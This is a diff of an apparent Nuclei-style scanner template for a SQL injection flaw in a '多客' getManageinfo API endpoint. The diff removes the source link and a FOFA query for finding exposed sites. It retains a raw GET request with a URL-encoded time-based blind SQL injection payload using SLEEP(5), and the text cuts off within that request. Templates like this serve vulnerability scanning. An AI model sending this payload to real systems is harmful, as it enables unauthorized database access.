@@ -3,12 +3,8 @@ info:
   name: 多客getManageinfo存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nzu1dggct8k4b6qa'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nzu1dggct8k4b6qa
-    fofa: body="/static/index/js/jweixin-1.2.0.js"
 http:
 - raw:
   - 'GET /api/index/quanManageList/getManageinfo?id=1%29+AND+%28SELECT+8888+FROM+%28SELECT%28SLEEP%285%29%29%29qBqH%29+AND+%288888%3D888 HTTP/1.1
